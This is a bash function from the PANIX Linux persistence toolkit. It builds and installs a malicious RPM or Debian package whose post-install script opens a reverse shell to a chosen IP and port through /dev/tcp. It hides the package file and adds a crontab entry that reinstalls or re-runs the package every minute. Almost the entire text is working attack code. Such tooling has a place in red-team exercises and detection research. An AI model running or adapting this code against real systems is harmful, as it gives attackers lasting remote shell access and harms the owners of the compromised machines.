setup_malicious_package() {
	local ip=""
	local port=""
	local mechanism=""
	local os_version=""
	local architecture=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_malicious_package() {
		echo "Usage: ./setup.sh --malicious-package [OPTIONS]"
		echo "--examples            Display command examples"
		echo "--ip <ip>             Specify IP address"
		echo "--port <port>         Specify port number"
		echo "--rpm                 Use RPM package manager"
		echo "--dpkg                Use DPKG package manager"
		echo "--help|-h             Show this help message"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--ip )
				shift
				ip="$1"
				;;
			--port )
				shift
				port="$1"
				;;
			--rpm )
				mechanism="$1"
				;;
			--dpkg )
				mechanism="$1"
				;;
			--examples )
				echo "Example:"
				echo "sudo ./panix.sh --malicious-package --ip 10.10.10.10 --port 1337 --rpm | --dpkg"
				exit 0
				;;
			--help | -h )
				usage_malicious_package
				exit 0
				;;
			* )
				echo "Invalid option: $1"
				echo "Try './setup.sh --malicious-package --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ -z $ip || -z $port || -z $mechanism ]]; then
		echo "Error: --ip, --port, and one of --rpm or --dpkg must be specified."
		echo "Try './setup.sh --malicious-package --help' for more information."
		exit 1
	fi

	case $mechanism in
		--rpm )
			if ! command -v rpm &> /dev/null; then
					echo "Warning: RPM does not seem to be available. It might not work."
					return 1
			fi

			if ! command -v rpmbuild &> /dev/null; then
					echo "Error: rpmbuild is not installed."
					exit 1
			fi

			# Ensure the directory structure exists
			mkdir -p ~/rpmbuild/SPECS
			mkdir -p ~/rpmbuild/BUILD
			mkdir -p ~/rpmbuild/RPMS
			mkdir -p ~/rpmbuild/SOURCES
			mkdir -p ~/rpmbuild/SRPMS

			# RPM package setup
			PACKAGE_NAME="panix"
			PACKAGE_VERSION="1.0"
			cat <<-EOF > ~/rpmbuild/SPECS/${PACKAGE_NAME}.spec
			Name: ${PACKAGE_NAME}
			Version: ${PACKAGE_VERSION}
			Release: 1%{?dist}
			Summary: RPM package with payload script
			License: MIT

			%description
			RPM package with a payload script that executes a reverse shell.

			%prep
			# No need to perform any preparation actions

			%install
			# Create directories
			mkdir -p %{buildroot}/usr/bin

			%files
			# No need to specify any files here since the payload is embedded

			%post
			# Trigger payload after installation
			nohup setsid bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1' &

			%clean
			rm -rf %{buildroot}

			%changelog
			* $(date +'%a %b %d %Y') John Doe <john.doe@example.com> 1.0-1
			- Initial package creation
			EOF
			# Build RPM package
			rpmbuild -bb ~/rpmbuild/SPECS/${PACKAGE_NAME}.spec

			# Install RPM package with forced overwrite
			VER=$(grep VERSION_ID /etc/os-release | cut -d '"' -f 2 | cut -d '.' -f 1)
			rpm -i --force ~/rpmbuild/RPMS/x86_64/${PACKAGE_NAME}-1.0-1.el${VER}.x86_64.rpm
			mv ~/rpmbuild/RPMS/x86_64/${PACKAGE_NAME}-1.0-1.el${VER}.x86_64.rpm /var/lib/rpm/${PACKAGE_NAME}.rpm
			rm -rf /root/rpmbuild
			# Add crontab entry for the current user
			echo "*/1 * * * * rpm -i --force /var/lib/rpm/${PACKAGE_NAME}.rpm > /dev/null 2>&1" | crontab -
			;;

		--dpkg )

			if ! command -v dpkg &> /dev/null; then
				echo "Warning: DPKG does not seem to be available. It might not work."
			fi

			# DPKG package setup
			PACKAGE_NAME="panix"
			PACKAGE_VERSION="1.0"
			DEB_DIR="${PACKAGE_NAME}/DEBIAN"
			PAYLOAD="#!/bin/sh\nnohup setsid bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1' &"

			# Create directory structure
			mkdir -p ${DEB_DIR}

			# Write postinst script
			echo -e "${PAYLOAD}" > ${DEB_DIR}/postinst
			chmod +x ${DEB_DIR}/postinst

			# Write control file
			echo "Package: ${PACKAGE_NAME}" > ${DEB_DIR}/control
			echo "Version: ${PACKAGE_VERSION}" >> ${DEB_DIR}/control
			echo "Architecture: all" >> ${DEB_DIR}/control
			echo "Maintainer: https://github.com/Aegrah/PANIX" >> ${DEB_DIR}/control
			echo "Description: This malicious package was added through PANIX" >> ${DEB_DIR}/control

			# Build the .deb package
			dpkg-deb --build ${PACKAGE_NAME}

			# Install the .deb package
			dpkg -i ${PACKAGE_NAME}.deb

			rm -rf ${PACKAGE_NAME}
			rm -rf ${DEB_DIR}

			# Add crontab entry for the current user
			echo "*/1 * * * * /var/lib/dpkg/info/${PACKAGE_NAME}.postinst configure > /dev/null 2>&1" | crontab -
			;;

		* )
			echo "Invalid mechanism specified."
			exit 1
			;;
	esac
	echo "[+] Malicious package persistence established."
}
